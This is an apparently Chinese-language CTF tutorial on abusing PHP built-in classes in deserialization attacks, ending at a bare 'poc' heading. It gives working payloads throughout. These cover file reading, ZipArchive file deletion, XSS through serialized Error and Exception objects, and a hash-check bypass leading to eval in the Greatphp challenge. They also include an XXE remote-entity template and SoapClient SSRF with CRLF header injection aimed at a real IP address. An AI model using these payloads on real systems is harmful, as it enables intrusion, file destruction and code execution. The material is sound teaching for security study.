<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$k</span> -&gt;<span class="variable">$line</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">key</span>()+<span class="number">1</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive()"></a>ZipArchive()</h4><p>利用ZipArchive()进行文件删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631676f9c.png" alt="image-20240313204731187"></p>
<p>文件已删除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> - <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;test.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>删除了test.zip文件，</p>
<p>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，在此模式下如果已经存在则会被覆盖，这是一个常数项，值为8</p>
<h4 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h4><p>利用ReflectionMethod获取注释的内容</p>
<p>(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8)</p>
<p>ReflectionFunctionAbstract::getDocComment — 获取注释内容<br>由该原生类中的getDocComment方法可以访问到注释的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    this is DocComment</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">type</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Apple&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;type&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getDocComment</span>());</span><br></pre></td></tr></table></figure>

<p>注释文本需符合&#x2F;**开头的规范否则无法识别</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66416315510f1.png" alt="image-20240313210010722"></p>
<p>ReflectionMethod(“Apple”,”type”);</p>
<p>在Apple类中type方法前的注释</p>
<h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p><strong>Error</strong> 是所有PHP内部错误类的基类。 (PHP 7, 8)</p>
<p>在开启报错的情况下</p>
<p>**Error::__toString ** error 的字符串表达</p>
<p>类属性</p>
<ul>
<li>message 错误消息内容</li>
<li>code 错误代码</li>
<li>file 抛出错误的文件名</li>
<li>line 抛出错误的行数</li>
</ul>
<p>Error内置有一个__toString()的方法，可以产生<strong>xss</strong>漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>将第二个输出结果赋值给第一个代码的a</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313210909018.png" alt="image-20240313210909018"></p>
<p>返回 Error 的 string表达形式。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631128b49.png" alt="image-20240313211614294"></p>
<h4 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h4><p>Exception与Error同理</p>
<p><strong>Exception</strong>是所有用户级异常的基类。 (PHP 5, 7, 8)</p>
<p>**Exception::__toString ** 将异常对象转换为字符串</p>
<p>类属性</p>
<ul>
<li>message 错误消息内容</li>
<li>code 错误代码</li>
<li>file 抛出错误的文件名</li>
<li>line 抛出错误的行数</li>
</ul>
<p>同样也有<strong>xss</strong>漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;text&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>同样将2赋值给1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163139aa2d.png" alt="image-20240313211434419"></p>
<p>返回转换为字符串（string）类型的异常。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664163197c706.png" alt="image-20240313211519361"></p>
<h4 id="绕hash"><a href="#绕hash" class="headerlink" title="绕hash"></a>绕hash</h4><p>利用Error和Exception</p>
<p>先看一下输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630dad872.png" alt="image-20240313212715298"></p>
<blockquote>
<p>Error: payload in &#x2F;box&#x2F;script.php:2<br>Stack trace:<br>#0 {main}<br>Error: payload in &#x2F;box&#x2F;script.php:3<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:4<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:6<br>Stack trace:<br>#0 {main}</p>
</blockquote>
<p>两个编译器编译后 对比发现这两个原生类返回的信息除了行号一模一样</p>
<p>利用这点，我们可以尝试进行hash函数的绕过，需要注意的是，必须将两个传入的对象放到同一行</p>
<p>因此我们可以进行简单的测试,发现使用此方法可以绕过hash强(弱)函数比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a不等于$b&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5值相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1值相等&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213054499.png" alt="image-20240313213054499"></p>
<p>没有问题</p>
<p>例：</p>
<p>[2020 极客大挑战]Greatphp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;&#125;<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>需要绕过两个hash强比较，且最终需要构造eval代码执行</p>
<p>显然正常方法是行不通的，而通过原生类可进行绕过</p>
<p>同样，当md5()和sha1()函数处理对象时，会自动调用__tostring方法</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">          </span><br><span class="line"> </span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;&#125;<span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;<span class="comment">//两次取反绕过正则$a=new Error($str,1);</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();<span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;<span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h4 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h4><p>SimpleXMLElement可解析XML 文档中的元素。 （PHP 5、PHP 7、PHP 8）</p>
<p>利用实例化该类的对象来传入xml代码进行<strong>xxe</strong>攻击，进而读取文件内容和命令执行</p>
<p>SimpleXMLElement::__construct — 创建一个新的 SimpleXMLElement 对象</p>
<p>参数：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213919494.png" alt="image-20240313213919494"></p>
<p>根据官方文档，发现当第三个参数为True时，即可实现远程xml文件载入，第二个参数的常量值设置为2即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;url&quot;&gt;%remote;]&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xee&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$xml_clss</span>=<span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="variable">$xml</span>,LIBXML_NOENT);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$xml_class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>LIBXML_NOENT也是一个常数</p>
<p>参考赛题：[SUCTF 2018]Homework</p>
<h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端，可以创建soap数据报文，与wsdl接口进行交互</p>
<p>soap：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOAP 是基于 XML 的简易协议，是用在分散或分布的环境中交换信息的简单的协议，可使应用程序在 HTTP 之上进行信息交换</span><br><span class="line"> </span><br><span class="line">SOAP是webService三要素（SOAP、WSDL、UDDI）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</span><br><span class="line"> </span><br><span class="line">其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</span><br></pre></td></tr></table></figure>



<p>soap扩展模块默认关闭，使用时需手动开启,php.ini配置文件里面开启extension&#x3D;php_soap.dll选项</p>
<p>SoapClient::__call —调用 SOAP 函数 (PHP 5, 7, 8)</p>
<p>通常，SOAP 函数可以作为SoapClient对象的方法调用</p>
<p>由此 可利用这个类进行ssrf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br><span class="line"> </span><br><span class="line">第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。</span><br><span class="line"> </span><br><span class="line">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</span><br></pre></td></tr></table></figure>



<p>由此：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://xxx.xxx.xxx:3333/index.php&#x27;</span>, </span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;http://xxx.xxx.xxx:3333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;111111&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();<span class="comment">//$c-&gt;nofun(); </span></span><br><span class="line"><span class="comment">//随便调用对象中不存在的方法，触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220612243.png" alt="image-20240313220612243"></p>
<p>监听：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631112ba6.png" alt="image-20240313220643842"></p>
<p>可以看到 SOAPAction和user_agent都可控</p>
<p>本地测试时发现，当使用此内置类(即soap协议)请求存在服务的端口时，会立即报错，而去访问不存在服务(未占用)的端口时，会等待一段时间报错，可以以此进行内网资产的探测。</p>
<p>同时还可以配合CRLF漏洞</p>
<p>可以通过 SoapClient 来控制其他参数或者post发送数据。例如:HTTP协议去攻击Redis</p>
<blockquote>
<p>CRLF：</p>
<p>HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。<br>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。<br>攻击者一旦向请求行或首部中的字段注入恶意的CRLF(\r\n)，就能注入一些首部字段或报文主体，并在响应中输出。</p>
</blockquote>
<p>通过结合CRLF，我们利用SoapClient+CRLF便可以干更多的事情，例如插入自定义Cookie，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nCookie: PHPSESSION=dasdasd564d6as4d6a&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220940648.png" alt="image-20240313220940648"></p>
<p>发送POST的数据包，这里需要将Content-Type设置为application&#x2F;x-www-form-urlencoded，我们可以通过<strong>添加两个\r\n来将原来的Content-Type挤下去，自定义一个新的Content-Type</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=3stu05dr969ogmprk28drnju93\r\nContent-Length: 10\r\n\r\npostdata&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641631747fd8.png" alt="image-20240313221037193"></p>
<p>参考赛题：ctfshow上的题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line"> </span><br><span class="line">array_pop($xff);</span><br><span class="line"> </span><br><span class="line">$ip = array_pop($xff); //获取xff头</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"> </span><br><span class="line">&#125;else&#123;</span><br><span class="line"> </span><br><span class="line">    $token = $_POST[&#x27;token&#x27;];</span><br><span class="line"> </span><br><span class="line">    if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc</p>
